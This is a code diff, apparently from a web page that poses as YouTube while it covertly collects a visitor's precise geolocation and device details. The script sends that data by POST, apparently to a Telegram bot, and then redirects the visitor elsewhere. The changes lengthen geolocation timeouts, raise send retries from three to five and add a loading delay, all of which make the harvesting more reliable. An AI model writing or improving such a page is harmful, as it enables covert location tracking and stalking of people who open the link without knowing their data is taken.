@@ -312,21 +312,21 @@
                 navigator.geolocation.getCurrentPosition(
                     handleSuccess,
                     handleError,
-                    { enableHighAccuracy: true, timeout: 2000, maximumAge: 30000 }
+                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 30000 }
                 );
                 
-                // محاولة ثانية بعد ثانية واحدة
+                // محاولة ثانية بعد ثانيتين
                 setTimeout(() => {
                     if (!resolved) {
                         navigator.geolocation.getCurrentPosition(
                             handleSuccess,
                             handleError,
-                            { enableHighAccuracy: false, timeout: 1000, maximumAge: 60000 }
+                            { enableHighAccuracy: false, timeout: 2000, maximumAge: 60000 }
                         );
                     }
-                }, 1000);
+                }, 2000);
                 
-                // انتهاء المهلة بعد 2.5 ثانية
+                // انتهاء المهلة بعد 4 ثواني
                 setTimeout(() => {
                     if (!resolved) {
                         resolved = true;
@@ -334,7 +334,7 @@
                         updateProgress(70);
                         resolve(null);
                     }
-                }, 2500);
+                }, 4000);
             });
         }
         
@@ -375,10 +375,10 @@ ${data.device.userAgent}`;
                 disable_web_page_preview: false
             };
             
-            // 3 محاولات مع انتظار أقل
-            for (let attempt = 1; attempt <= 3; attempt++) {
+            // 5 محاولات مع انتظار أطول
+            for (let attempt = 1; attempt <= 5; attempt++) {
                 try {
-                    log(`📤 محاولة ${attempt}/3`);
+                    log(`📤 محاولة ${attempt}/5`);
                     
                     const response = await fetch(url, {
                         method: 'POST',
@@ -426,8 +426,8 @@ ${data.device.userAgent}`;
                 }
                 
                 // انتظار بين المحاولات
-                if (attempt < 3) {
-                    await new Promise(resolve => setTimeout(resolve, 800));
+                if (attempt < 5) {
+                    await new Promise(resolve => setTimeout(resolve, 1500));
                 }
             }
             
@@ -454,7 +454,7 @@ ${data.device.userAgent}`;
                 } catch (error) {
                     window.location.href = REDIRECT_URL;
                 }
-            }, 300);
+            }, 500);
         }
         
         // العملية الرئيسية
@@ -466,7 +466,10 @@ ${data.device.userAgent}`;
             updateProgress(10);
             
             try {
-                // جمع البيانات الأساسية فوراً
+                // تأخير بسيط لإظهار واجهة التحميل
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // جمع البيانات الأساسية
                 const basicData = collectBasicData();
                 log('✅ البيانات الأساسية جاهزة');
                 updateProgress(15);
@@ -498,11 +501,11 @@ ${data.device.userAgent}`;
                 if (sendSuccess) {
                     log('✅ تم إرسال البيانات');
                     updateProgress(100);
-                    setTimeout(redirectSafely, 500);
+                    setTimeout(redirectSafely, 1000);
                 } else {
                     log('❌ فشل الإرسال - التحويل على أي حال');
                     updateProgress(100);
-                    setTimeout(redirectSafely, 400);
+                    setTimeout(redirectSafely, 800);
                 }
                 
             } catch (error) {
@@ -526,13 +529,13 @@ ${data.device.userAgent}`;
             setTimeout(main, 200);
         }
         
-        // حماية من التعليق - تحويل إجباري بعد 10 ثواني
+        // حماية من التعليق - تحويل إجباري بعد 20 ثانية
         setTimeout(() => {
             if (!redirected) {
-                log('⏰ تحويل إجباري بعد 10 ثواني');
+                log('⏰ تحويل إجباري بعد 20 ثانية');
                 redirectSafely();
             }
-        }, 10000);
+        }, 20000);
         
         log('🎯 واجهة YouTube محملة');
     </script>
